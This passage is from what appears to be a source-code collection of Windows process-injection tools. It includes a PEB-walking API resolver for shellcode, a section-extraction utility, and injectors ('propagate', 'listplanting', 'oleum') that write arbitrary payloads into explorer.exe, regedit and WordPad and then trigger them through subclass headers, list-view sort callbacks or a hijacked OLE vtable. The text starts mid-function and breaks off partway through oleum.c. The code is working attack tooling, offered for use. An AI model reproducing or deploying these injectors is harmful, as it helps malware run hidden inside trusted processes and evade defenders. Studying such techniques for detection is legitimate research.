    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no export table, return NULL
    if (rva==0) return NULL;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;
    
    // if no api names, return NULL
    if (cnt==0) return NULL;
    
    adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    do {
      // calculate hash of api string
      api = RVA2VA(PCHAR, base, sym[cnt-1]);
      // add to DLL hash and compare
      if (!xstrcmp(pszAPI, api)){
        // return address of function
        api_adr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
        return api_adr;
      }
    } while (--cnt && api_adr==0);
    return api_adr;
}

// search all modules in the PEB for API
LPVOID xGetProcAddress(LPVOID pszAPI) {
    PPEB                  peb;
    PPEB_LDR_DATA         ldr;
    PLDR_DATA_TABLE_ENTRY dte;
    LPVOID                api_adr=NULL;
    
  #if defined(_WIN64)
    peb = (PPEB) __readgsqword(0x60);
  #else
    peb = (PPEB) __readfsdword(0x30);
  #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && api_adr == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // search the export table for api
      api_adr=FindExport(dte->DllBase, (PCHAR)pszAPI);  
    }
    return api_adr;
}

// same as strcmp
int xstrcmp(char *s1, char *s2){
    while(*s1 && (*s1==*s2))s1++,s2++;
    return (int)*(unsigned char*)s1 - *(unsigned char*)s2;
}

```

`payload/x86/propagate.txt`:

```txt
SubclassProc@24
FindExport
xGetProcAddress
xstrcmp

```

`payload/x86/svcctrl.txt`:

```txt
Handler
FindExport
xGetProcAddress
xstrcmp

```

`payload/x86/xbin.cpp`:

```cpp
/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#include <windows.h>

#pragma comment (lib, "user32.lib")

PBYTE img=NULL;
ULONGLONG img_base;
HANDLE hFile, hMap;
LPBYTE lpAddress;
DWORD cpu_arch, flags;

// return pointer to DOS header
PIMAGE_DOS_HEADER DosHdr (void) {
  return (PIMAGE_DOS_HEADER)lpAddress;
}

// return pointer to NT header
PIMAGE_NT_HEADERS NtHdr (void) {
  return (PIMAGE_NT_HEADERS) (lpAddress + DosHdr()->e_lfanew);
}

// return pointer to File header
PIMAGE_FILE_HEADER FileHdr (void) {
  return &NtHdr()->FileHeader;
}

// determines CPU architecture of binary
BOOL is32 (void) {
  return FileHdr()->Machine==IMAGE_FILE_MACHINE_I386;
}

// determines CPU architecture of binary
BOOL is64 (void) {
  return FileHdr()->Machine==IMAGE_FILE_MACHINE_AMD64;
}

// return pointer to Optional header
LPVOID OptHdr (void) {
  return (LPVOID)&NtHdr()->OptionalHeader;
}

// return pointer to first section header
PIMAGE_SECTION_HEADER SecHdr (void)
{
  PIMAGE_NT_HEADERS nt=NtHdr();
  
  return (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
  nt->FileHeader.SizeOfOptionalHeader);
}

DWORD DirSize (void)
{
  if (is32()) {
    return ((PIMAGE_OPTIONAL_HEADER32)OptHdr())->NumberOfRvaAndSizes;
  } else {
    return ((PIMAGE_OPTIONAL_HEADER64)OptHdr())->NumberOfRvaAndSizes;
  }
}

DWORD SecSize (void)
{
  return NtHdr()->FileHeader.NumberOfSections;
}

PIMAGE_DATA_DIRECTORY Dirs (void)
{
  if (is32()) {
    return ((PIMAGE_OPTIONAL_HEADER32)OptHdr())->DataDirectory;
  } else {
    return ((PIMAGE_OPTIONAL_HEADER64)OptHdr())->DataDirectory;
  }
}

ULONGLONG ImgBase (void)
{
  if (is32()) {
    return ((PIMAGE_OPTIONAL_HEADER32)OptHdr())->ImageBase;
  } else {
    return ((PIMAGE_OPTIONAL_HEADER64)OptHdr())->ImageBase;
  }
}

// valid dos header?
int valid_dos_hdr (void)
{
  PIMAGE_DOS_HEADER dos=DosHdr();
  if (dos->e_magic!=IMAGE_DOS_SIGNATURE) return 0;
  return (dos->e_lfanew != 0);
}

// valid nt headers
int valid_nt_hdr (void)
{
  return NtHdr()->Signature==IMAGE_NT_SIGNATURE;
}

int isObj (void) {
  PIMAGE_DOS_HEADER dos=DosHdr();
  
  return ((dos->e_magic==IMAGE_FILE_MACHINE_AMD64 ||
  dos->e_magic==IMAGE_FILE_MACHINE_I386) && 
  dos->e_sp==0);
}

DWORD rva2ofs (DWORD rva) {
  int i;
  
  PIMAGE_SECTION_HEADER sec=SecHdr();
  
  for (i=0; i<SecSize(); i++) {
    if (rva >= sec[i].VirtualAddress && rva < sec[i].VirtualAddress + sec[i].SizeOfRawData)
    return sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);
  }
  return -1;
}

void bin2file (char name[], BYTE bin[], DWORD len)
{
  char fname[MAX_PATH];
  
  wsprintf (name, "%s%i.bin", name, is32() ? 32 : 64);
  
  FILE *out=fopen (name, "wb");
  if (out!=NULL)
  {
    fwrite (bin, 1, len, out);
    fclose (out);
  }
}

void dump_section (char fname[], char section[])
{
  DWORD i, ofs;
  PIMAGE_SECTION_HEADER sec=SecHdr();
  PBYTE pRawData;
  
  for (i=0; i<SecSize(); i++) 
  {
    if (strcmp((char*)sec[i].Name, section)==0) {
      printf ("\nSECTION HEADER #%i\n", i+1);
      printf ("%8s name\n",            sec[i].Name);
      printf ("%8X virtual size\n",    sec[i].Misc.VirtualSize);
    
      if (is32())
      {
        printf ("%8X virtual address (%08X to %08X)\n",
        sec[i].VirtualAddress, 
        (DWORD)img_base + sec[i].VirtualAddress, 
        (DWORD)img_base + sec[i].Misc.VirtualSize - 1);      
      } else {
        printf ("%8X virtual address (%016llX to %016llX)\n",
        sec[i].VirtualAddress, 
        img_base + sec[i].VirtualAddress, 
        img_base + sec[i].Misc.VirtualSize);
      }
      printf ("%8X size of raw data (%i bytes padding)\n",
      sec[i].SizeOfRawData, 
      sec[i].SizeOfRawData - sec[i].Misc.VirtualSize - 1);
      
      printf ("%8X file pointer to raw data (%08X to %08X)\n", 
      sec[i].PointerToRawData, sec[i].PointerToRawData, 
      sec[i].PointerToRawData + sec[i].SizeOfRawData - 1);
      
      printf ("%8X file pointer to relocation table\n",   sec[i].PointerToRelocations);
      printf ("%8X file pointer to line numbers\n",       sec[i].PointerToLinenumbers);
      printf ("%8X number of relocations\n",              sec[i].NumberOfRelocations);
      printf ("%8X number of line numbers\n",             sec[i].NumberOfLinenumbers);
      printf ("%8X flags\n",                              sec[i].Characteristics);
      
      ofs=rva2ofs (sec[i].VirtualAddress);
      if (ofs != -1)
      {
        pRawData = (PBYTE) (lpAddress + ofs);
        
        bin2file (fname, pRawData, sec[i].Misc.VirtualSize);
        break;
      }
    }
  }
}

void dump_img (char name[], char section[])
{ 
  if (!valid_dos_hdr()) {
    printf ("  [ invalid dos header\n");
    return;
  }
  
  if (!valid_nt_hdr()) {
    printf ("  [ invalid nt header\n");
    return;
  }
  
  dump_section (name, section);
}

int open_img (char f[])
{ 
  int     r=0;
  
  hFile=CreateFile (f, GENERIC_READ, FILE_SHARE_READ, 
      NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
  if (hFile!=INVALID_HANDLE_VALUE) {
    hMap=CreateFileMapping (hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hMap!=NULL) {
      lpAddress=(LPBYTE)MapViewOfFile (hMap, FILE_MAP_READ, 0, 0, 0);
      r=1;
    }
  }
  return r;
}

void close_img (void)
{
  if (lpAddress!=NULL) UnmapViewOfFile ((LPCVOID)lpAddress);
  if (hMap     !=NULL) CloseHandle (hMap);
  if (hFile    !=NULL) CloseHandle (hFile);
}

int main (int argc, char *argv[])
{
  if (argc != 3) {
    printf ("\n[ usage: xbin <exe> <section name>\n");
    return 0;
  }
  if (open_img(argv[1])) {
    if (isObj()) {
      printf ("\n[ Looks like an object file");
    } else {
      dump_img (argv[1], argv[2]);
    }
  }
  close_img();
  return 0;
}

```

`propagate/Makefile`:

```
propagate:
	cl /nologo /MD propagate.c
clean:
	del propagate.exe *.obj
```

`propagate/enumprop.cpp`:

```cpp
/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define UNICODE

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "user32.lib")

#include <iostream>
#include <vector>
#include <algorithm>

typedef struct _win_props_t {
  DWORD  dwPid;
  WCHAR  ImageName[MAX_PATH];
  HANDLE hProperty;
  HWND   hParentWnd;
  HWND   hChildWnd;
  WCHAR  ParentClassName[MAX_PATH];
  WCHAR  ChildClassName[MAX_PATH];
} WINPROPS, *PWINPROPS;
  
std::vector<WINPROPS> windows;
int maxName=16, maxClass=16;
bool bAll=true;

// we want to ignore duplicates
BOOL IsEntry(PWINPROPS e) {
    BOOL bFound = FALSE;
    
    for(int i=0;i<windows.size(); i++) {
      // same process id?
      if(e->dwPid == windows.at(i).dwPid) {
        // same property?
        if(e->hProperty == windows.at(i).hProperty) {
          bFound = TRUE;
          break;
        }
      }
    }
    return bFound;
}

BOOL GetProcessImageName(DWORD dwPid, LPWSTR ImageName, DWORD dwSize) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    BOOL           bFound=FALSE;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if(dwPid == pe32.th32ProcessID) {
          lstrcpyn(ImageName, pe32.szExeFile, dwSize);
          bFound = TRUE;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return bFound;
}

// callback for property list
BOOL CALLBACK PropEnumProc(HWND hwnd, 
  LPCTSTR lpszString, HANDLE hData) 
{
    WINPROPS wp;
    HANDLE   hp;
    
    hp = GetProp(hwnd, L"UxSubclassInfo");
    if(hp==NULL) hp = GetProp(hwnd, L"CC32SubclassInfo");
    
    if(hp != NULL) {
      ZeroMemory(&wp, sizeof(wp));
      
      GetWindowThreadProcessId(hwnd, &wp.dwPid);
      
      wp.hProperty  = hp;
      wp.hChildWnd  = hwnd;
      wp.hParentWnd = GetParent(hwnd);
      
      GetClassName(wp.hParentWnd, wp.ParentClassName, MAX_PATH);
      GetClassName(hwnd, wp.ChildClassName, MAX_PATH); 
      GetProcessImageName(wp.dwPid, wp.ImageName, MAX_PATH);
      
      maxName  = max(maxName,  lstrlen(wp.ImageName));
      maxClass = max(maxClass, lstrlen(wp.ParentClassName));
      
      // if not already saved
      if(!IsEntry(&wp)) {
        windows.push_back(wp);
      }
    }
    return TRUE;
}

// callback for child windows
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    EnumProps(hwnd, PropEnumProc);
    
    return TRUE;
}

// callback for parent windows
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    EnumChildWindows(hwnd, EnumChildProc, 0);
    EnumProps(hwnd, PropEnumProc);
    
    return TRUE;
}

bool sortEntries(const WINPROPS &a, const WINPROPS &b) {
    return lstrcmp(a.ParentClassName, b.ParentClassName)<0;
}

int GetPropList(void) {
  
    windows.clear();
    
    EnumWindows(EnumWindowsProc, 0);
    
    std::sort(windows.begin(), windows.end(), sortEntries);
    
    return windows.size();
}

int wmain(int argc, wchar_t *argv[]){
    GetPropList();

    wprintf(L"\n\n%-5s\t%-*s\t%-*s\t%-*s\t%-16s\n", 
      L"PID", 
      maxName,  L"Image Name", 
      maxClass, L"Parent Class", 
      maxClass, L"Child Class",
      L"Subclass Header");

    wprintf(L"%s\t%s\t%s\t%s\t%s\n", 
      std::wstring(5,        L'-').c_str(), 
      std::wstring(maxName,  L'-').c_str(), 
      std::wstring(maxClass, L'-').c_str(),
      std::wstring(maxClass, L'-').c_str(),
      std::wstring(16,       L'-').c_str());
      
    for(int i=0;i<windows.size(); i++) {
      if(!bAll && lstrcmpi(L"explorer.exe", 
        windows.at(i).ImageName)!=0) continue;
      
      wprintf(L"%-5i\t%-*s\t%-*s\t%-*s\t%p\n", 
        windows.at(i).dwPid,
        maxName,
        windows.at(i).ImageName,
        maxClass,
        windows.at(i).ParentClassName,
        maxClass,
        windows.at(i).ChildClassName,
        (void*)windows.at(i).hProperty);
    }
    wprintf(L"\nFound %lld subclassed windows\n", windows.size());
    return 0;
}
```

`propagate/propagate.c`:

```c
/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define UNICODE
#include <windows.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comctl32.lib")

#include <stdio.h>

typedef LRESULT (CALLBACK *SUBCLASSPROC)(
   HWND      hWnd,
   UINT      uMsg,
   WPARAM    wParam,
   LPARAM    lParam,
   UINT_PTR  uIdSubclass,
   DWORD_PTR dwRefData);

typedef struct _SUBCLASS_CALL {
  SUBCLASSPROC pfnSubclass;    // subclass procedure
  WPARAM       uIdSubclass;    // unique subclass identifier
  DWORD_PTR    dwRefData;      // optional ref data
} SUBCLASS_CALL, PSUBCLASS_CALL;

typedef struct _SUBCLASS_FRAME {
  UINT                    uCallIndex;   // index of next callback to call
  UINT                    uDeepestCall; // deepest uCallIndex on stack
  struct _SUBCLASS_FRAME  *pFramePrev;  // previous subclass frame pointer
  struct _SUBCLASS_HEADER *pHeader;     // header associated with this frame
} SUBCLASS_FRAME, PSUBCLASS_FRAME;

typedef struct _SUBCLASS_HEADER {
  UINT           uRefs;        // subclass count
  UINT           uAlloc;       // allocated subclass call nodes
  UINT           uCleanup;     // index of call node to clean up
  DWORD          dwThreadId;   // thread id of window we are hooking
  SUBCLASS_FRAME *pFrameCur;   // current subclass frame pointer
  SUBCLASS_CALL  CallArray[1]; // base of packed call node array
} SUBCLASS_HEADER, *PSUBCLASS_HEADER;

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID propagate(LPVOID payload, DWORD payloadSize) {
    HANDLE          hp, p;
    DWORD           id;
    HWND            pwh, cwh;
    SUBCLASS_HEADER sh;
    LPVOID          psh, pfnSubclass;
    SIZE_T          rd,wr;

    // 1. Obtain the parent window handle
    pwh = FindWindow(L"Progman", NULL);

    // 2. Obtain the child window handle
    cwh = FindWindowEx(pwh, NULL, L"SHELLDLL_DefView", NULL);

    // 3. Obtain the handle of subclass header
    p = GetProp(cwh, L"UxSubclassInfo");

    // GetProcessHandleFromHwnd
    // 4. Obtain the process id for the explorer.exe
    GetWindowThreadProcessId(cwh, &id);

    // 5. Open explorer.exe
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 6. Read the contents of current subclass header
    ReadProcessMemory(hp, (LPVOID)p, &sh, sizeof(sh), &rd);

    // 7. Allocate RW memory for a new subclass header
    psh = VirtualAllocEx(hp, NULL, sizeof(sh),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    // 8. Allocate RWX memory for the payload
    pfnSubclass = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 9. Write the payload to memory
    WriteProcessMemory(hp, pfnSubclass,
        payload, payloadSize, &wr);

    // 10. Set the pfnSubclass field to payload address, and write
    //    back to process in new area of memory
    sh.CallArray[0].pfnSubclass = (SUBCLASSPROC)pfnSubclass;
    WriteProcessMemory(hp, psh, &sh, sizeof(sh), &wr);

    // 11. update the subclass procedure with SetProp
    SetProp(cwh, L"UxSubclassInfo", psh);

    // 12. Trigger the payload via a windows message
    PostMessage(cwh, WM_CLOSE, 0, 0);

    // 13. Restore original subclass header
    SetProp(cwh, L"UxSubclassInfo", p);

    // 14. free memory and close handles
    VirtualFreeEx(hp, psh, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, pfnSubclass, 0,  MEM_RELEASE);

    CloseHandle(hp);
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: propagate <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    propagate(pic, len);
    return 0;
}
```

`richedit/build.bat`:

```bat
@echo off
cl /nologo wordwarping.c
cl /nologo streamception.c
cl /nologo oleum.c
cl /nologo listplanting.c
cl /nologo treepoline.c
del *.obj
```

`richedit/listplanting.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <Windows.h>
#include <richedit.h>
#include <commctrl.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

// requires elevated privileges
VOID listplanting(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          wpw, lvm;
    LPVOID        cs;
    SIZE_T        wr;
    
    // 1. get the window handle
    wpw = FindWindow(L"RegEdit_RegEdit", NULL);
    lvm = FindWindowEx(wpw, 0, L"SysListView32", 0);
   
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(lvm, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 3. Allocate RWX memory and copy the payload there.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. Trigger payload
    PostMessage(lvm, LVM_SORTITEMS, 0, (LPARAM)cs);
    
    // 5. Free memory and close process handle
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    CloseHandle(hp);
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: listplanting <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    listplanting(pic, len);
    return 0;
}

```

`richedit/oleum.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#include <Windows.h>
#include <richedit.h>
#include <richole.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

typedef struct _IRichEditOle_t {
    ULONG_PTR QueryInterface;
    ULONG_PTR AddRef;
    ULONG_PTR Release;
    ULONG_PTR GetClientSite;
    ULONG_PTR GetObjectCount;
    ULONG_PTR GetLinkCount;
    ULONG_PTR GetObject;
    ULONG_PTR InsertObject;
    ULONG_PTR ConvertObject;
    ULONG_PTR ActivateAs;
    ULONG_PTR SetHostNames;
    ULONG_PTR SetLinkAvailable;
    ULONG_PTR SetDvaspect;
    ULONG_PTR HandsOffStorage;
    ULONG_PTR SaveCompleted;
    ULONG_PTR InPlaceDeactivate;
    ULONG_PTR ContextSensitiveHelp;
    ULONG_PTR GetClipboardData;
    ULONG_PTR ImportDataObject;
} _IRichEditOle;
    
DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}
            
// doesn't require elevated privileges for processes in the same session            
VOID oleum(LPVOID payload, DWORD payloadSize) {
    HANDLE                hp;
    DWORD                 id;
    HWND                  wpw, rew;
    LPVOID                cs, ds, ptr, mem, tbl;
    SIZE_T                rd, wr;
    _IRichEditOle         reo;
    
    // 1. Get the window handle
    wpw = FindWindow(L"WordPadClass", NULL);
    rew = FindWindowEx(wpw, NULL, L"RICHEDIT50W", NULL);
    
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(rew, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 3. Allocate RWX memory and copy the payload there
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. Allocate RW memory for the current address
    ptr = VirtualAllocEx(hp, NULL, sizeof(ULONG_PTR),
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
      
    // 5. Query the interface
    SendMessage(rew, EM_GETOLEINTERFACE, 0, (LPARAM)ptr);
    
    // 6. Read the memory address
    ReadProcessMemory(hp, ptr, &mem, sizeof(ULONG_PTR), &wr);

    // 7. Read IRichEditOle.lpVtbl
    ReadProcessMemory(hp, mem, &tbl, sizeof(ULONG_PTR), &wr);

    // 8. Read virtual function table
    ReadProcessMemory(hp, tbl, &reo, sizeof(_IRichEditOle), &wr);

    // 9. Allocate memory for copy of virtual table
    ds = VirtualAllocEx(hp, NULL, sizeof(_IRichEditOle),
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
      
    // 10. Set the GetClipboardData method to address of payload
    reo.GetClipboardData = (ULONG_PTR)cs;
    
    // 11. Write new virtual function table to remote memory
    WriteProcessMemory(hp, ds, &reo, sizeof(_IRichEditOle), &wr);
    
    // 12. update IRichEditOle.lpVtbl
